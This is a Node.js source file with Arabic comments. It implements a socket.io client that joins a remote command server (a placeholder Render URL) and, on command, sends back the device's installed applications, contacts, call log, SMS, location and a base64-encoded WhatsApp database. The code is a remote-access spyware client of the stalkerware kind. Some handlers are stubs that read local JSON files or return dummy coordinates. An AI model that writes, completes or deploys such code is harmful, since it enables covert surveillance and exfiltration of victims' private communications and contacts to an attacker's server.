const io = require('socket.io-client');
const socket = io('https://YOUR_RENDER_URL'); // ضع هنا رابط السيرفر على Render

const os = require('os');
const fs = require('fs');
const path = require('path');

const deviceId = 'device_' + Math.floor(Math.random()*10000);
const model = os.type() + ' ' + os.arch();

socket.emit('join', { id: deviceId, model });

function sendResult(action, data){
  socket.emit(action, { id: deviceId, action, data });
}

// الأوامر الحقيقية
socket.on('getInstalledApps', () => {
  // مثال على التطبيقات المثبتة على جهازك (Node.js يمكنه الوصول للملفات)
  const apps = fs.readdirSync('/Applications'); // في نظام Mac، أو مسار برامج Windows
  sendResult('getInstalledApps', apps);
});

socket.on('getContacts', () => {
  // يمكنك ربطها بملفات محلية لديك أو قاعدة بيانات
  const contacts = fs.existsSync('contacts.json') ? JSON.parse(fs.readFileSync('contacts.json')) : [];
  sendResult('getContacts', contacts);
});

socket.on('getCallLog', () => {
  const calls = fs.existsSync('calls.json') ? JSON.parse(fs.readFileSync('calls.json')) : [];
  sendResult('getCallLog', calls);
});

socket.on('getSMS', () => {
  const sms = fs.existsSync('sms.json') ? JSON.parse(fs.readFileSync('sms.json')) : [];
  sendResult('getSMS', sms);
});

socket.on('getLocation', () => {
  // Node.js لا يستطيع الموقع الجغرافي بدون GPS محلي، يمكن ربط API أو GPS جهازك
  sendResult('getLocation', { lat: 0, lon: 0 });
});

socket.on('downloadWhatsappDatabase', () => {
  const waPath = path.join(__dirname, 'WhatsAppDB.db');
  if(fs.existsSync(waPath)){
    const data = fs.readFileSync(waPath).toString('base64');
    sendResult('downloadWhatsappDatabase', data);
  } else sendResult('downloadWhatsappDatabase', 'ملف غير موجود');
});
